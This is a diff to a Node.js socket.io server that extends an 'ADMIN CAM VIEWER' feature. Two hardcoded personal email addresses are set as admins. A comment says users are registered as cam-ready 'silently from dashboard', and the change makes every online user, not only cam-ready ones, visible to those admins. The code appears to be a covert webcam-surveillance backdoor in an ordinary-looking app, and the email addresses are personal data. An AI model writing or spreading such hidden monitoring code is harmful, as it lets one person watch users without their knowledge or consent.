@@ -222,26 +222,32 @@ io.on('connection', (socket) => {
   });
 
   // ─── ADMIN CAM VIEWER ────────────────────────────────────────────────────────
+  const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];
 
   // User announces they are cam-ready (called silently from dashboard)
   socket.on('cam_viewer_ready', ({ email, username }) => {
     socket.camEmail = email ? email.toLowerCase().trim() : null;
     socket.camUsername = username || email;
-    // Notify the admin account if online
-    const adminRoom = 'hammadnawz519@gmail.com';
-    socket.to(adminRoom).emit('cam_user_online', {
-      email: socket.camEmail,
-      username: socket.camUsername,
-      socketId: socket.id
+    // Notify all admin accounts if online
+    ADMIN_EMAILS.forEach(adminEmail => {
+      socket.to(adminEmail).emit('cam_user_online', {
+        email: socket.camEmail,
+        username: socket.camUsername,
+        socketId: socket.id
+      });
     });
   });
 
-  // Admin requests the full list of cam-ready users
+  // Admin requests the full list of cam-ready / online users
   socket.on('cam_get_users', () => {
     const list = [];
+    const seenSockets = new Set();
     for (const [, s] of io.sockets.sockets) {
-      if (s.camEmail && s.id !== socket.id) {
-        list.push({ email: s.camEmail, username: s.camUsername, socketId: s.id });
+      const email = s.camEmail || s.userEmail;
+      const username = s.camUsername || s.username || (email ? email.split('@')[0] : 'User');
+      if (email && s.id !== socket.id && !seenSockets.has(s.id)) {
+        seenSockets.add(s.id);
+        list.push({ email, username, socketId: s.id });
       }
     }
     socket.emit('cam_users_list', list);
@@ -280,10 +286,11 @@ io.on('connection', (socket) => {
     // Remove from active calls
     activeCalls.delete(socket.id);
 
-    // Notify admin that this cam user went offline
-    if (socket.camEmail) {
-      const adminRoom = 'hammadnawz519@gmail.com';
-      socket.to(adminRoom).emit('cam_user_offline', { socketId: socket.id });
+    // Notify admins that this cam user went offline
+    if (socket.camEmail || socket.userEmail) {
+      ADMIN_EMAILS.forEach(adminEmail => {
+        socket.to(adminEmail).emit('cam_user_offline', { socketId: socket.id });
+      });
     }
 
     // Remove from online tracking
